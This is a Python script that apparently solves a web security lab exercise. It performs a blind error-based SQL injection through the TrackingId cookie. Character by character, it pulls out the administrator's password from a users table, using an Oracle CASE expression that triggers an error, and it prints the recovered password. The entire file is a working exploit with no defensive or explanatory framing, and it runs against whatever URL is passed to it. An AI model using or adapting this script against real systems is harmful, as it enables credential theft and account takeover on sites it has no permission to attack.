#!/usr/bin/env python3
import sys
import requests
import urllib3
import string
from pwn import *
urllib3.disable_warnings()
proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def findPassword(url,cookies,longitud):
    iny = log.progress("Realizando inyeccion: ")
    lp = log.progress("Caracteres encontrados: ")
    pazz=""
    trackingId=cookies["TrackingId"]
    lista=string.ascii_letters+string.digits
    injectionTemplate="{trackingId}'||(SELECT CASE WHEN SUBSTR(password,{pos},1)='{c}' THEN TO_CHAR(TO_NUMBER('AAS')) ELSE 'A' END FROM users WHERE username='administrator')--"
    for pos in range(1,longitud+1):
        for c in lista:
            cookies["TrackingId"] = injectionTemplate.format(trackingId=trackingId,pos=pos,c=c)
            iny.status(f"{cookies['TrackingId']}")
            response = requests.get(url=url,verify=False,cookies=cookies)
            if "Internal Server Error" in response.text:
                pazz+=c
                lp.status(pazz)
                break

    print(f"[+] La contraseña para el usuario administrator es: {pazz}")



def main():
    url=sys.argv[1].strip("/")
    response = requests.get(url,verify=False)
    findPassword(url=url,cookies=response.cookies.get_dict(),longitud=20)


main()